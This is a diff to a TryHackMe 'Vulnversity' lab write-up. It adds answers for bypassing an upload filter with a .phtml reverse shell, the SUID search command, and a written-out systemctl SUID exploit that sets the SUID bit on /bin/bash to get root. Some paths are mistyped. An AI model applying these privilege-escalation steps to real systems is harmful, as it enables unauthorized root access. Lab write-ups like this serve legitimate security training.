@@ -45,6 +45,9 @@ What is the directory that has an upload form page?\
 Try upload a few file types to the server, what common extension seems to be blocked?\
 .php
 
+Which extension seems to be allowed to upload php reverse shell?\
+.pthml \
+You can try it out using [extensionChecker.py](https://github.com/mayank-s16/Tryhackme-machines-notes/blob/main/vulnversity/extensionChecker.py "Extension Checker Script") file that is uploaded in thie repo.<br>
 
 What is the name of the user who manages the webserver?\
 bill
@@ -58,7 +61,29 @@ Find it inside bill's home directory.
 ***
 In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. 
 SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
-For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd).
-This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.\
-On the system, search for all SUID files. What file stands out?
+For example, the binary file to change your password has the SUID bit set on it (`/usr/bin/passwd`).
+This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.<br>
+Note down the below command for finding out files whose user bit is set.<br>
+`find / -perm -u=s -type f 2>/dev/null`\
+
+On the system, search for all SUID files. What file stands out?\
 /bin/systemctl
+
+Click [here](https://gtfobins.github.io/gtfobins/systemctl/#suid "GTFOBins SUID for systemctl") to find out privilege escalation using `systemctl` SUID.
+
+Note** You can also set SUID bit of /bin/bash using systemctl GTFObins url. Modify the command part as
+> TF=$(mktemp).service\
+> echo '[Service]\
+> Type=oneshot\
+> ExecStart=/bin/sh -c "chmod +s /bin/bash"\
+> [Install]\
+> WantedBy=multi-user.target' > $TF\
+> /bin/systemctl link $TF\
+> /bin/systemctl enable --now $TF>
+
+After executing the above commands one by one it will set the uid bit of \bin\bash.
+To confirm this thing type the following command.
+> ls -l \bin\bash\
+Now you can become root.
+> \bin\bash -p
+---
